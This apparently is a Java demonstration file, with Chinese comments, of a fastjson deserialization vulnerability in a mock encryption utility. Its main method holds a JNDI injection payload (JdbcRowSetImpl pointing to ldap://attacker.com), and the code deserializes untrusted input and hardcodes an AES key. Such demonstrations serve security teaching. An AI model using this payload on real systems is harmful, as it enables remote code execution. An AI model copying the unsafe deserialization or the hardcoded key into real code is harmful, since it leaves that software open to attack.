import com.alibaba.fastjson.JSON;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

// 模拟配置实体类
class EncryptionConfig {
    private String algorithm = "AES";
    private String key = "defaultKey123456";
    private boolean enableCompression = true;

    public String getAlgorithm() { return algorithm; }
    public String getKey() { return key; }
}

// 文件加密工具类
public class FileEncryptor {
    // 模拟从HTTP请求反序列化配置
    public static EncryptionConfig loadConfig(String jsonInput) {
        // 脆弱点：直接反序列化不可信输入
        return JSON.parseObject(jsonInput, EncryptionConfig.class);
    }

    // 模拟加密过程
    public static String encrypt(String data, EncryptionConfig config) throws Exception {
        SecretKey secretKey = new SecretKeySpec(config.getKey().getBytes(), config.getAlgorithm());
        Cipher cipher = Cipher.getInstance(config.getAlgorithm());
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        return Base64.getEncoder().encodeToString(cipher.doFinal(data.getBytes()));
    }

    // 模拟解密过程
    public static String decrypt(String cipherText, EncryptionConfig config) throws Exception {
        SecretKey secretKey = new SecretKeySpec(config.getKey().getBytes(), config.getAlgorithm());
        Cipher cipher = Cipher.getInstance(config.getAlgorithm());
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        return new String(cipher.doFinal(Base64.getDecoder().decode(cipherText)));
    }

    public static void main(String[] args) {
        try {
            // 模拟攻击者输入
            String maliciousInput = "{\\"@type\\":\\"com.sun.rowset.JdbcRowSetImpl\\",\\"dataSourceName\\":\\"ldap://attacker.com/a\\",\\"autoCommit\\":true}";
            
            // 触发反序列化漏洞
            EncryptionConfig config = loadConfig(maliciousInput);
            
            // 正常加密流程（不会执行到）
            String encrypted = encrypt("SecretData", config);
            System.out.println("Encrypted: " + encrypted);
            
        } catch (Exception e) {
            System.err.println("Error: " + e.getMessage());
        }
    }
}